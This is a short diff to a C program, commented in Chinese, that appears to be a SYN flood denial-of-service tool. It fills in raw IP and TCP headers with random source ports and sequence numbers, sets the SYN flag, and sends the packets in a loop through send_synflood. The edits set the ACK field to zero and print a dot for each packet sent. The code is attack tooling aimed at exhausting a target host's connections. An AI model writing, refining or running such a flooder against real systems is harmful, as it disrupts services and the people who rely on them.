@@ -91,6 +91,7 @@ checksum (unsigned short *buffer, unsigned short size)
 /* 发送SYN包函数
  * 填写IP头部，TCP头部
  * TCP伪头部仅用于校验和的计算
+
  */
 void
 init_header(struct ip *ip, struct tcphdr *tcp, struct pseudohdr *pseudoheader)
@@ -112,7 +113,7 @@ init_header(struct ip *ip, struct tcphdr *tcp, struct pseudohdr *pseudoheader)
 	tcp->sport = htons( rand()%16383 + 49152 );
 	tcp->dport = htons(dst_port);
 	tcp->seq = htonl( rand()%90000000 + 2345 ); 
-	tcp->ack = htonl( rand()%90000000 + 2345 ); 
+	tcp->ack = 0; 
 	tcp->lenres = (sizeof(struct tcphdr)/4<<4|0);
 	tcp->flag = 0x02;
 	tcp->win = htons (2048);  
@@ -169,6 +170,7 @@ send_synflood(struct sockaddr_in *addr)
 		bzero(sendbuf, sizeof(sendbuf));
 		memcpy(sendbuf, &ip, sizeof(struct ip));
 		memcpy(sendbuf+sizeof(struct ip), &tcp, sizeof(struct tcphdr));
+		printf(".");
 		if (
 			sendto(sockfd, sendbuf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr))
 			< 0)
